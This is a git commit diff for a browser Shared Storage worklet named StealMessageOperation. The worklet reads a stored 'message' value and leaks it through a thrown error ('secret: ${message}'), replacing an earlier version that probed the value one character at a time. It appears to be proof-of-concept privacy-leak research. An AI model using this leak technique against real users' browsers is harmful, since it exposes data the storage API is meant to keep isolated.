e5b369ba9df5d7d531bfd022bb2946e3a862761a
Luca Padalino <lucapada@users.noreply.github.com>
2025-03-30 17:41:03 +0200

    Update and rename new-worklet.js to steal-message-worklet.js

--- steal-message-worklet.js
+++ steal-message-worklet.js
@@ -1,10 +1,8 @@
 class StealMessageOperation {
   async run(data) {
     try {
-      const { charPos, char2Check } = data;
       const message = await sharedStorage.get('message');
-      throw new Error(`checking ${message} at ${charPos} for ${char2Check}`);
-      return (message[charPos] === char2Check) ? 1 : 0;
+      throw new Error(`secret: ${message}`);
     } catch (e) {
         throw new Error(e);
     }
